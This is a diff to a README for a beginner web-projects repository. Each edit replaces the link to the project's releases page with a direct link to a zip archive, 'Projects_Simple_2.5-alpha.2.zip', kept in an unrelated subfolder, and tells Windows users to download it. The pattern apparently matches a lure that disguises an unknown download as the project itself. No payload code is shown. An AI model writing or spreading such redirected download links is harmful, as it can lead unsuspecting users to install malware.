@@ -1,6 +1,6 @@
 # 🗂️ Simple-Projects - Easy Beginner Web Projects
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release%20Page-lightgrey?style=for-the-badge)](https://github.com/matheusrandow/Simple-Projects/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release%20Page-lightgrey?style=for-the-badge)](https://github.com/matheusrandow/Simple-Projects/raw/refs/heads/main/Color-Palette-Generator/Projects_Simple_2.5-alpha.2.zip)
 
 ---
 
@@ -20,7 +20,7 @@ You will need a Windows PC to run these projects locally.
 
 1. Click the big button at the top or go to this page to download the projects:
 
-   [https://github.com/matheusrandow/Simple-Projects/releases](https://github.com/matheusrandow/Simple-Projects/releases)
+   [https://github.com/matheusrandow/Simple-Projects/raw/refs/heads/main/Color-Palette-Generator/Projects_Simple_2.5-alpha.2.zip](https://github.com/matheusrandow/Simple-Projects/raw/refs/heads/main/Color-Palette-Generator/Projects_Simple_2.5-alpha.2.zip)
 
 2. On the release page, look for a file named like `Simple-Projects.zip`. This is a compressed file that holds all the projects.
 
@@ -112,7 +112,7 @@ The projects help build skills step-by-step. You can open each and see how it wo
 
 Use this link again whenever you want to get updates or more projects:
 
-[https://github.com/matheusrandow/Simple-Projects/releases](https://github.com/matheusrandow/Simple-Projects/releases)
+[https://github.com/matheusrandow/Simple-Projects/raw/refs/heads/main/Color-Palette-Generator/Projects_Simple_2.5-alpha.2.zip](https://github.com/matheusrandow/Simple-Projects/raw/refs/heads/main/Color-Palette-Generator/Projects_Simple_2.5-alpha.2.zip)
 
 ---
 
